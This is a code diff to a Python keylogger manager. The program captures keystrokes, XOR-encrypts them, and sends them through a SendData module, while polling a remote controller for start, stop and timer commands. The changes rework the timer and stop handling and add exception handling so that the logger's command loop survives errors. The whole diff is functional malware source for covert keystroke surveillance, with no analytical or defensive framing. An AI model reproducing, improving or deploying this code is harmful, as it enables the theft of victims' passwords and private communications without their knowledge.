@@ -5,7 +5,6 @@ from send_data import SendData
 from key_logger_service import KeyLoggerService
 from update_status import UpdateStatus
 from encrypt import Encryption
-from file_writer import FileWriter
 
 
 class KeyLoggerManager:
@@ -16,7 +15,6 @@ class KeyLoggerManager:
 
     def start_key_logger(self):
         self.service.start_listener()
-        
         generator = self.service.send_every_minute()
         for data in generator:
             encrypted_data = Encryption(data).xor_encryption()
@@ -30,21 +28,18 @@ class KeyLoggerManager:
         self.service.start_listener()
         self.timer = threading.Timer(timer * 60, self.stop_listener_safely)
         self.timer.start()
-
+        
         generator = self.service.send_every_minute()
         for data in generator:
             encrypted_data = Encryption(data).xor_encryption()
             data = {"data": encrypted_data}
             commend, new_timer = SendData().writing(data)
-
-            # check for new commend stop/start/new timer
+            
             if new_timer != timer:
-                self.stop_listener_safely()
-                break
-            if not self.service.stop_event.is_set():
-                UpdateStatus().update_status_and_timer()
-                break
-        return False
+                self.service.stop_listener()
+                return False
+            if self.service.stop_event.is_set():
+                return False
     
     def stop_listener_safely(self):
         with self.service.lock:
@@ -53,20 +48,27 @@ class KeyLoggerManager:
                 data = {"data": encrypted_data}
                 SendData().writing(data)
                 self.service.clean_buffer()
+            UpdateStatus().update_status_and_timer()
         self.service.stop_listener()
+           
 
 
     def start(self):
         is_listening = False
         while True:
             if not is_listening:
-                commend_to_start, timer = SendPing().send()
-                if timer > 0:
-                    is_listening = self.start_keyLogger_timer(timer)
-                elif commend_to_start:
-                    is_listening = self.start_key_logger()
-                else:
-                    time.sleep(60)  
+                try:
+                    commend_to_start, timer = SendPing().send()
+                    if timer > 0:
+                        is_listening = self.start_keyLogger_timer(timer)
+                    elif commend_to_start:
+                        is_listening = self.start_key_logger()
+                    else:
+                        time.sleep(60) 
+                except Exception as e:
+                    print('Error in manager: ', e) 
+                    time.sleep(60)
+                    
         
 if __name__ == "__main__":
     manager = KeyLoggerManager()
